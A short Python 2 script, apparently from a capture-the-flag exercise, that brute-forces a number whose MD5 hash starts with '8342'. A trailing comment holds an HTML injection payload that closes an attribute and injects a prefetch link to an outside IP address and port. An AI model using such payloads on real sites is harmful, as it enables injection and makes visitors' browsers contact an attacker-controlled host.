import hashlib  

for i in range(1000000):
    if hashlib.md5(str(i)).hexdigest()[:4] == "8342":
        print i
        break

# //"><link rel="prefetch" src="http://123.206.203.108:12256/index.php">
